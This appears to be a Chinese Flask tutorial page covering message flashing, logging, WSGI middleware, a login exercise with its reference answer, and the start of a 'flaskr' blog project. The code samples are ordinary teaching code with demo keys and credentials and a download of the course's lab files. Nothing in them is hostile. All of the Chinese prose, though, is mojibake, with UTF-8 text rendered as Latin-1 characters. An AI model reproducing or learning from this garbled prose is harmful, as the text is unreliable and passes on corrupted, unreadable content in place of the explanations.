æä¾›äº†ä¸€ä¸ªçœŸæ­£çš„ç®€å•çš„æ–¹å¼æ¥é€šè¿‡æ¶ˆæ¯é—ªç°ç³»ç»Ÿç»™ç”¨æˆ·åé¦ˆã€‚æ¶ˆæ¯é—ªç°ç³»ç»ŸåŸºæœ¬ä¸Šä½¿å¾—åœ¨è¯·æ±‚ç»“æŸæ—¶è®°å½•ä¿¡æ¯å¹¶åœ¨ä¸‹ä¸€ä¸ª ï¼ˆä¸”ä»…åœ¨ä¸‹ä¸€ä¸ªï¼‰è¯·æ±‚ä¸­è®¿é—®ã€‚é€šå¸¸ç»“åˆæ¨¡æ¿å¸ƒå±€æ¥æ˜¾ç¤ºæ¶ˆæ¯ã€‚</p><p>ä½¿ç”¨flash()æ–¹æ³•æ¥é—ªç°ä¸€ä¸ªæ¶ˆæ¯ï¼Œä½¿ç”¨get_flashed_messages()èƒ½å¤Ÿè·å–æ¶ˆæ¯ï¼Œget_flashed_messages()ä¹Ÿèƒ½ç”¨äºæ¨¡æ¿ä¸­ã€‚</p><p>ä¸‹é¢æ¥çœ‹ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼Œåœ¨ /home/shiyanlou/Code ç›®å½•ä¸‹æ–°å»º flashTest.py æ–‡ä»¶ï¼Œå¹¶å‘å…¶ä¸­å†™å…¥å¦‚ä¸‹ä»£ç ï¼š<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, flash, redirect, render_template, \</span><br><span class="line">     request, url_for</span><br><span class="line"></span><br><span class="line">app = Flask(__name_<span class="number">_</span>)</span><br><span class="line">app.secret_key = b<span class="string">'_5#y2L"F4Q8z\n\xec]/'</span></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/login'</span>, methods=[<span class="string">'GET'</span>, <span class="string">'POST'</span>])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span></span><span class="symbol">:</span></span><br><span class="line">    error = None</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">if</span> request.form[<span class="string">'username'</span>] != <span class="string">'admin'</span> <span class="keyword">or</span> \</span><br><span class="line">                request.form[<span class="string">'password'</span>] != <span class="string">'secret'</span><span class="symbol">:</span></span><br><span class="line">            error = <span class="string">'Invalid credentials'</span></span><br><span class="line">        <span class="symbol">else:</span></span><br><span class="line">            flash(<span class="string">'You were successfully logged in'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'login.html'</span>, error=error)</span><br></pre></td></tr></table></figure></p><p>ç„¶ååœ¨ /home/shiyanlou/Code/templates ç›®å½•ä¸‹æ–°å»º base.html é¡µé¢ï¼Œå…¶ä¸­å†™å…¥åŸºæœ¬çš„æ¨¡æ¿ä»£ç ï¼Œä»£ç ä¸»è¦æ˜¯ä»åç«¯è·å– flash æ¶ˆæ¯ä»¥åŠé”™è¯¯ä¿¡æ¯ã€‚</p><figure class="highlight cal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;title&gt;My Application&lt;/title&gt;</span><br><span class="line">&amp;<span class="string">#123</span>;% <span class="keyword">with</span> messages = get_flashed_messages() %&amp;<span class="string">#125</span>;</span><br><span class="line">  &amp;<span class="string">#123</span>;% <span class="keyword">if</span> messages %&amp;<span class="string">#125</span>;</span><br><span class="line">    &lt;ul class=flashes&gt;</span><br><span class="line">    &amp;<span class="string">#123</span>;% <span class="keyword">for</span> message <span class="keyword">in</span> messages %&amp;<span class="string">#125</span>;</span><br><span class="line">      &lt;li&gt;&amp;<span class="string">#123</span>;&amp;<span class="string">#123</span>; message &amp;<span class="string">#125</span>;&amp;<span class="string">#125</span>;&lt;/li&gt;</span><br><span class="line">    &amp;<span class="string">#123</span>;% endfor %&amp;<span class="string">#125</span>;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">  &amp;<span class="string">#123</span>;% endif %&amp;<span class="string">#125</span>;</span><br><span class="line">&amp;<span class="string">#123</span>;% endwith %&amp;<span class="string">#125</span>;</span><br><span class="line">&amp;<span class="string">#123</span>;% block body %&amp;<span class="string">#125</span>;&amp;<span class="string">#123</span>;% endblock %&amp;<span class="string">#125</span>;</span><br></pre></td></tr></table></figure><p>åœ¨è¯¥ç›®å½•ä¸‹æ–°å»º index.html é¡µé¢ï¼Œè¿™ä¸ªé¡µé¢ç»§æ‰¿äº base.html é¡µé¢ï¼š<br><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp;#123;% extends <span class="string">"base.html"</span> %&amp;#125;</span><br><span class="line">&amp;#123;% block body %&amp;#125;</span><br><span class="line">  &lt;h1&gt;Overview&lt;/h1&gt;</span><br><span class="line">  &lt;p&gt;<span class="keyword">Do</span> you want <span class="keyword">to</span> &lt;a href=<span class="string">"&amp;#123;&amp;#123; url_for('login') &amp;#125;&amp;#125;"</span>&gt;<span class="keyword">log</span> <span class="keyword">in</span>?&lt;/a&gt;</span><br><span class="line">&amp;#123;% endblock %&amp;#125;</span><br></pre></td></tr></table></figure></p><p>åœ¨è¯¥ç›®å½•ä¸‹æ–°å»º login.html é¡µé¢ï¼Œè¿™ä¸ªé¡µé¢ä¹Ÿç»§æ‰¿äº base.html é¡µé¢ï¼š.<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&amp;#123;% extends "base.html" %&amp;#125;</span><br><span class="line">&amp;#123;% block body %&amp;#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  &amp;#123;% if error %&amp;#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">error</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span>Error:<span class="tag">&lt;/<span class="name">strong</span>&gt;</span> &amp;#123;&amp;#123; error &amp;#125;&amp;#125;</span><br><span class="line">  &amp;#123;% endif %&amp;#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">post</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dt</span>&gt;</span>Username:</span><br><span class="line">      <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">name</span>=<span class="string">username</span> <span class="attr">value</span>=<span class="string">"&amp;#123;&amp;#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">          request.form.username &amp;#125;&amp;#125;"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dt</span>&gt;</span>Password:</span><br><span class="line">      <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">password</span> <span class="attr">name</span>=<span class="string">password</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">Login</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">&amp;#123;% endblock %&amp;#125;</span><br></pre></td></tr></table></figure></p><p>æŒ‰ç…§å‰é¢çš„æ–¹å¼è¿è¡Œç¨‹åºï¼š</p><p>å½“è®¿é—®é¦–é¡µ <a href="http://127.0.0.1:5000ï¼Œä¼šæç¤º" target="_blank" rel="noopener">http://127.0.0.1:5000ï¼Œä¼šæç¤º</a> Do you want to log in?ï¼Œç‚¹å‡»é“¾æ¥è·³è½¬åˆ°ç™»å½•é¡µé¢ã€‚</p><p>åœ¨ç™»å½•é¡µé¢ <a href="http://127.0.0.1:5000/loginï¼Œè¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œå¦‚æœè¾“å…¥é”™è¯¯çš„ä¿¡æ¯æ¯”å¦‚ä¸¤ä¸ªéƒ½ä¸º" target="_blank" rel="noopener">http://127.0.0.1:5000/loginï¼Œè¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œå¦‚æœè¾“å…¥é”™è¯¯çš„ä¿¡æ¯æ¯”å¦‚ä¸¤ä¸ªéƒ½ä¸º</a> shiyanlouï¼Œç‚¹å‡» Loginï¼Œå°±ä¼šå‡ºç°é”™è¯¯æç¤º Error: Invalid credentialsã€‚å¦‚æœç”¨æˆ·åè¾“å…¥ adminã€å¯†ç è¾“å…¥ secretï¼Œç‚¹å‡» Loginï¼Œå°±ä¼šè·³è½¬åˆ°é¦–é¡µï¼ŒåŒæ—¶åœ¨é¦–é¡µä¼šæ˜¾ç¤º flash æ¶ˆæ¯ You were successfully logged inã€‚</p><h2 id="æ—¥å¿—"><a href="#æ—¥å¿—" class="headerlink" title="æ—¥å¿—"></a>æ—¥å¿—</h2><p>æœ‰æ—¶å€™ä½ ä¼šé‡åˆ°ä¸€ç§æƒ…å†µï¼šç†è®ºä¸Šæ¥è¯´ä½ å¤„ç†çš„æ•°æ®åº”è¯¥æ˜¯æ­£ç¡®çš„ï¼Œç„¶è€Œå®é™…ä¸Šå¹¶ä¸æ­£ç¡®çš„çŠ¶å†µã€‚æ¯”å¦‚ä½ å¯èƒ½æœ‰ä¸€äº›å®¢æˆ·ç«¯ä»£ç ï¼Œä»£ç å‘æœåŠ¡å™¨å‘é€ä¸€ä¸ª HTTP è¯·æ±‚ä½†æ˜¯æ˜¾ç„¶å®ƒæ˜¯é”™è¯¯çš„ã€‚è¿™å¯èƒ½æ˜¯ç”±äºç”¨æˆ·ç¯¡æ”¹æ•°æ®ï¼Œæˆ–å®¢æˆ·ç«¯ä»£ç å¤±è´¥ã€‚å¤§éƒ¨åˆ†æ—¶å€™é’ˆå¯¹è¿™ä¸€æƒ…å†µè¿”å›400 Bad Requestå°±å¯ä»¥äº†ï¼Œä½†æ˜¯æœ‰æ—¶å€™ä¸èƒ½è¿™æ ·åšï¼Œä»£ç å¿…é¡»ç»§ç»­å·¥ä½œã€‚</p><p>ä½ ä¹Ÿæœ‰å¯èƒ½æƒ³è¦è®°å½•ä¸€äº›å‘ç”Ÿçš„ä¸æ­£å¸¸äº‹æƒ…ã€‚è¿™æ—¶å€™æ—¥å¿—å°±æ´¾ä¸Šç”¨å¤„ã€‚ä» Flask 0.3 å¼€å§‹æ—¥å¿—è®°å½•æ˜¯é¢„å…ˆé…ç½®å¥½çš„ã€‚</p><p>è¿™é‡Œæœ‰ä¸€äº›æ—¥å¿—è°ƒç”¨çš„ä¾‹å­:</p><p>app.logger.debug(â€˜A value for debuggingâ€™)<br>app.logger.warning(â€˜A warning occurred (%d apples)â€™, 42)<br>app.logger.error(â€˜An error occurredâ€™)<br>é™„å¸¦çš„ logger æ˜¯ä¸€ä¸ªæ ‡å‡†çš„æ—¥å¿—ç±» Logger ï¼Œå› æ­¤æ›´å¤šçš„ä¿¡æ¯è¯·æŸ¥é˜…å®˜æ–¹æ–‡æ¡£ logging documentationã€‚</p><p>æ•´åˆ WSGI ä¸­é—´ä»¶<br>å¦‚æœä½ æƒ³ç»™ä½ çš„åº”ç”¨æ·»åŠ  WSGI ä¸­é—´ä»¶ï¼Œä½ å¯ä»¥å°è£…å†…éƒ¨ WSGI åº”ç”¨ã€‚ä¾‹å¦‚å¦‚æœä½ æƒ³ä½¿ç”¨ Werkzeug åŒ…ä¸­çš„æŸä¸ªä¸­é—´ä»¶æ¥åº”ä»˜ lighttpd ä¸­çš„ bugsï¼Œä½ å¯ä»¥è¿™æ ·åš:</p><p>from werkzeug.contrib.fixers import LighttpdCGIRootFix<br>app.wsgi_app = LighttpdCGIRootFix(app.wsgi_app)</p><h2 id="ç»ƒä¹ -1"><a href="#ç»ƒä¹ -1" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h2><p>è¯·å®ç°ä¸€ä¸ªå®Œæ•´çš„ç”¨æˆ·ç™»å½•åŠŸèƒ½:</p><p>å½“è®¿é—®åœ°å€ <a href="http://127.0.0.1:5000/login" target="_blank" rel="noopener">http://127.0.0.1:5000/login</a> ï¼Œå‡ºç°ç™»å½•é¡µé¢ï¼Œå¯ä»¥ä½¿ç”¨ç”¨æˆ·åå’Œå¯†ç å¡«å†™ç™»å½•è¡¨å•ã€‚<br>å¦‚æœç”¨æˆ·åå’Œå¯†ç éƒ½ä¸ºshiyanlouï¼Œé‚£ä¹ˆå°±æŠŠç”¨æˆ·åæ•°æ®æ”¾åˆ°sessionä¸­ï¼ŒæŠŠåœ°å€é‡å®šå‘åˆ°é¦–é¡µæ˜¾ç¤ºHello shiyanlouï¼ŒåŒæ—¶é—ªç°æ¶ˆæ¯ you were logged inã€‚<br>å¦‚æœç”¨æˆ·åå’Œå¯†ç ä¸å¯¹ï¼Œä¾ç„¶æŠŠåœ°å€é‡å®šå‘åˆ°é¦–é¡µæ˜¾ç¤ºhello worldï¼ŒåŒæ—¶é—ªç°æ¶ˆæ¯ username or password invalidã€‚<br>å‚è€ƒç­”æ¡ˆ<br>æ–‡ä»¶ç›®å½•ç»“æ„å¦‚ä¸‹æ‰€ç¤ºï¼š<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">/app.py</span></span><br><span class="line"><span class="string">/templates</span></span><br><span class="line">    <span class="string">/index.html</span></span><br><span class="line">    <span class="string">/login.html</span></span><br></pre></td></tr></table></figure></p><p>åœ¨ app.py æ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹ä»£ç ï¼š<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> flash, redirect, url_for, render_template, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">b'_5#y2L"F4Q8z\n\xec]/'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/&lt;name&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,name=name)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">if</span> request.form[<span class="string">'username'</span>] != <span class="string">'shiyanlou'</span> <span class="keyword">or</span> request.form[<span class="string">'password'</span>] != <span class="string">'shiyanlou'</span>:</span><br><span class="line">            flash(<span class="string">'username or password invalid'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>, name=<span class="string">'world'</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            session[<span class="string">'username'</span>] = request.form[<span class="string">'username'</span>]</span><br><span class="line">            name = request.form[<span class="string">'username'</span>]</span><br><span class="line">            flash(<span class="string">'you were logged in'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>, name=name))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'login.html'</span>)</span><br></pre></td></tr></table></figure></p><p>åœ¨ templates/index.html æ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹ä»£ç ï¼š<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Index<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    &amp;#123;% for message in get_flashed_messages() %&amp;#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">flash</span>&gt;</span>&amp;#123;&amp;#123; message &amp;#125;&amp;#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    &amp;#123;% endfor %&amp;#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello &amp;#123;&amp;#123;name&amp;#125;&amp;#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>åœ¨ templates/login.html æ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹ä»£ç ï¼š<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"&amp;#123;&amp;#123; url_for('login') &amp;#125;&amp;#125;"</span> <span class="attr">method</span>=<span class="string">post</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dt</span>&gt;</span>Username:</span><br><span class="line">            <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">name</span>=<span class="string">username</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dt</span>&gt;</span>Password:</span><br><span class="line">            <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">password</span> <span class="attr">name</span>=<span class="string">password</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">Login</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h1 id="Flaské¡¹ç›®å®æˆ˜ä¹‹åšå®¢å¼€å‘ï¼ˆä¸€ï¼‰"><a href="#Flaské¡¹ç›®å®æˆ˜ä¹‹åšå®¢å¼€å‘ï¼ˆä¸€ï¼‰" class="headerlink" title="Flaské¡¹ç›®å®æˆ˜ä¹‹åšå®¢å¼€å‘ï¼ˆä¸€ï¼‰"></a>Flaské¡¹ç›®å®æˆ˜ä¹‹åšå®¢å¼€å‘ï¼ˆä¸€ï¼‰</h1><p>å®éªŒæºç ï¼š<br>wget <a href="http://labfile.oss.aliyuncs.com/courses/29/flaskr.zip" target="_blank" rel="noopener">http://labfile.oss.aliyuncs.com/courses/29/flaskr.zip</a><br>unzip flaskr.zip<br>å®éªŒä»£ç å»ºè®®ç»Ÿä¸€å­˜æ”¾åœ¨ /home/shiyanlou/Code ç›®å½•ä¸‹ã€‚<br>è¿™é‡Œæˆ‘ä»¬å°†åšå®¢åº”ç”¨èµ·åä¸ºflaskrï¼Œä¹Ÿå¯ä»¥å–ä¸€ä¸ªä¸é‚£ä¹ˆ web 2.0 çš„åå­—ã€‚åŸºæœ¬ä¸Šæˆ‘ä»¬æƒ³è¦å®ƒåšå¦‚ä¸‹çš„äº‹æƒ…ï¼š</p><p>æ ¹æ®é…ç½®æ–‡ä»¶ä¸­çš„è®¤è¯å…è®¸ç”¨æˆ·ç™»å½•ä»¥åŠæ³¨é”€ã€‚ä»…ä»…æ”¯æŒä¸€ä¸ªç”¨æˆ·ã€‚<br>å½“ç”¨æˆ·ç™»å½•åï¼Œä»–ä»¬å¯ä»¥æ·»åŠ æ–°çš„æ¡ç›®ï¼Œè¿™äº›æ¡ç›®æ˜¯ç”±çº¯æ–‡æœ¬çš„æ ‡é¢˜å’Œ HTML çš„æ­£æ–‡æ„æˆã€‚å› ä¸ºæˆ‘ä»¬ä¿¡ä»»ç”¨æˆ·è¿™é‡Œçš„ HTML æ˜¯å®‰å…¨çš„ã€‚<br>é¡µé¢å€’åºæ˜¾ç¤ºæ‰€æœ‰æ¡ç›®ï¼ˆæ–°çš„æ¡ç›®åœ¨å‰ï¼‰ï¼Œå¹¶ä¸”ç”¨æˆ·ç™»å…¥åå¯ä»¥åœ¨æ­¤æ·»åŠ æ–°æ¡ç›®ã€‚<br>æˆ‘ä»¬å°†åœ¨è¿™ä¸ªåº”ç”¨ä¸­ç›´æ¥ä½¿ç”¨ SQLite 3 å› ä¸ºå®ƒè¶³å¤Ÿåº”ä»˜è¿™ç§è§„æ¨¡çš„åº”ç”¨ã€‚å¯¹æ›´å¤§çš„åº”ç”¨ä½¿ç”¨ SQLAlchemy æ˜¯ååˆ†æœ‰æ„ä¹‰çš„ï¼Œå®ƒä»¥ä¸€ç§æ›´æ™ºèƒ½æ–¹å¼å¤„ç†æ•°æ®åº“è¿æ¥ï¼Œå…è®¸ä½ ä¸€æ¬¡è¿æ¥å¤šä¸ªä¸åŒçš„å…³ç³»æ•°æ®åº“ã€‚ä½ ä¹Ÿå¯ä»¥è€ƒè™‘æµè¡Œçš„ NoSQL æ•°æ®åº“ï¼Œå‰ææ˜¯ä½ çš„æ•°æ®æ›´é€‚åˆå®ƒä»¬ã€‚</p><p>è¿™æ˜¯æœ€ç»ˆåº”ç”¨çš„ä¸€ä¸ªæˆªå›¾:</p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1cyxv45i1j30qa0eb76c.jpg" alt=""></p><p>åœ¨å¼€å§‹ä¹‹å‰ï¼Œè®©æˆ‘ä»¬ä¸ºè¿™ä¸ªåº”ç”¨åˆ›å»ºéœ€è¦çš„æ–‡ä»¶å¤¹:<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">/flaskr</span></span><br><span class="line">    <span class="string">/static</span></span><br><span class="line">    <span class="string">/templates</span></span><br></pre></td></tr></table></figure></p><p>flaskrï¼šé¡¹ç›®æ€»æ–‡ä»¶å¤¹ã€‚å…¶ä¸­ä¼šå­˜æ”¾æ•°æ®åº“ä»£ç æ–‡ä»¶ schema.sql å’Œ ä¸»ä»£ç æ–‡ä»¶ flaskr.pyã€‚<br>staticï¼šé¡¹ç›®çš„èµ„æºæ–‡ä»¶ã€‚ç”¨äºå­˜æ”¾ css å’Œ javascript æ–‡ä»¶ã€‚<br>templatesï¼šé¡¹ç›®å‰ç«¯é¡µé¢æ–‡ä»¶ã€‚ç”¨äºå­˜æ”¾å‰ç«¯é¡µé¢æ¨¡æ¿ã€‚</p><h2 id="æ•°æ®åº“æ¨¡å¼"><a href="#æ•°æ®åº“æ¨¡å¼" class="headerlink" title="æ•°æ®åº“æ¨¡å¼"></a>æ•°æ®åº“æ¨¡å¼</h2><p>é¦–å…ˆæˆ‘ä»¬è¦åˆ›å»ºæ•°æ®åº“æ¨¡å¼ã€‚å¯¹äºè¿™ä¸ªåº”ç”¨ä»…ä¸€å¼ è¡¨å°±è¶³å¤Ÿäº†ï¼Œè€Œä¸”æˆ‘ä»¬åªæƒ³æ”¯æŒ SQLite ï¼Œæ‰€ä»¥å¾ˆç®€å•ã€‚åœ¨ Code/flaskr ç›®å½•ä¸‹æ–°å»º schema.sql æ–‡ä»¶å¹¶å‘å…¶ä¸­å†™å…¥å¦‚ä¸‹ä»£ç ï¼š<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> entries;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> entries (</span><br><span class="line">  <span class="keyword">id</span> <span class="built_in">integer</span> primary <span class="keyword">key</span> autoincrement,</span><br><span class="line">  title <span class="keyword">string</span> <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">  <span class="built_in">text</span> <span class="keyword">string</span> <span class="keyword">not</span> <span class="literal">null</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure></p><p>è¿™ä¸ªæ¨¡å¼ç”±ä¸€ä¸ªç§°ä¸ºentriesçš„å•è¡¨æ„æˆï¼Œåœ¨è¿™ä¸ªè¡¨ä¸­æ¯è¡ŒåŒ…å«ä¸€ä¸ªidï¼Œä¸€ä¸ªtitleå’Œä¸€ä¸ªtextã€‚idæ˜¯ä¸€ä¸ªè‡ªå¢çš„æ•´æ•°è€Œä¸”æ˜¯ä¸»é”®ï¼Œå…¶ä½™ä¸¤ä¸ªä¸ºéç©ºçš„å­—ç¬¦ä¸²ã€‚</p><h2 id="åº”ç”¨ä»£ç "><a href="#åº”ç”¨ä»£ç " class="headerlink" title="åº”ç”¨ä»£ç "></a>åº”ç”¨ä»£ç </h2><p>ç°åœ¨æˆ‘ä»¬å·²ç»æœ‰äº†æ•°æ®åº“æ¨¡å¼äº†ï¼Œå¯ä»¥åˆ›å»ºåº”ç”¨çš„æ¨¡å—äº†ã€‚</p><p>åœ¨ Code/flaskr ç›®å½•ä¸‹æ–°å»º flaskr.py æ–‡ä»¶ã€‚å¯¹äºå°åº”ç”¨ï¼Œç›´æ¥æŠŠé…ç½®æ”¾åœ¨ä¸»æ¨¡å—é‡Œï¼Œæ­£å¦‚æˆ‘ä»¬ç°åœ¨è¦åšçš„ä¸€æ ·ï¼Œè¿™æ˜¯å¯è¡Œçš„ã€‚ç„¶è€Œä¸€ä¸ªæ›´å¹²å‡€çš„è§£å†³æ–¹æ¡ˆå°±æ˜¯å•ç‹¬åˆ›å»º.iniæˆ–è€….pyæ–‡ä»¶æ¥ç€åŠ è½½æˆ–è€…å¯¼å…¥é‡Œé¢çš„å€¼ã€‚</p><p>åœ¨ flaskr.py æ–‡ä»¶ä¸­å†™å…¥å¦‚ä¸‹ä»£ç :<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¯¼å…¥æ‰€æœ‰çš„æ¨¡å—</span></span><br><span class="line">import sqlite3</span><br><span class="line">from flask 